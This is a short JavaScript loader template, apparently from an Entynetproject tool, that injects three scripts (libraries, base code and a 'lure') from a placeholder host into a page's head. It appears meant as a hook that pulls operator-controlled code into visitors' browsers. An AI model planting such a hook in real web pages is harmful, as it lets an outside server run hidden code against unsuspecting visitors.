// MIT License
//
// Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

(function() {
	var paths = [
		'[HOST_ADDRESS]/static/js/[LIBS_SRC]',
		'[HOST_ADDRESS]/static/js/[BASE_SRC]',
		'[HOST_ADDRESS]/static/js/[LURE_SRC]'
	];
	window.gMapsApiKey = "[YOUR_GMAPS_API_KEY]";
	var imported = {};
	var idx = 0;

	loadScript(function(){
		idx++;
		loadScript(function(){
			idx++;
			window.serverPath = '[HOST_ADDRESS]';
			loadScript(function(){
				idx++;
			});
		});
	});

	function loadScript(callback){
		imported = document.createElement('script');
	    imported.type = 'text/javascript';
		imported.src = paths[idx];

	    imported.onload = callback;

	    var head = document.getElementsByTagName('head')[0];
	    head.appendChild(imported, head);
	}
}())
